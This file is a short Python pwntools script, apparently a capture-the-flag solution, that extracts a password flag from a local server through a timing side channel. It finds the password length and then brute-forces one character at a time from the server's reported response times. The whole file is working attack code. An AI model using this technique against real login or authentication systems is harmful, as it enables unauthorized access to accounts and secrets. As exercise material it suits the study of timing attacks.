from pwn import *
import string

p = remote("localhost", 1234)#process("./server.py")

def try_password(password):
    p.sendlineafter(b"Password: ", password.encode())
    result = p.recvline()

    if b"How did you guess it??" in result:
        log.success(f"Got flag: {password}")
        exit()
    else:
        return float(result.split()[3])

def guess_length():
    i = 1

    while True:
        if try_password("A" * i) > 0.01:
            log.info(f"Got length: {i}")
            return i
        
        i += 1

alphabet = string.ascii_lowercase + string.digits + "{}_"
password = ""
last_time = 0.01
i = 0

length = guess_length()

while not password.endswith("}"):
    attempt = alphabet[i]
    padding = (length - len(password) - 1) * "A"
    attempt_time = try_password(password + attempt + padding)

    if attempt_time - last_time > 0.005:
        password += attempt
        last_time = attempt_time

        log.info(f"New char! {password}")

    i += 1
    i %= len(alphabet)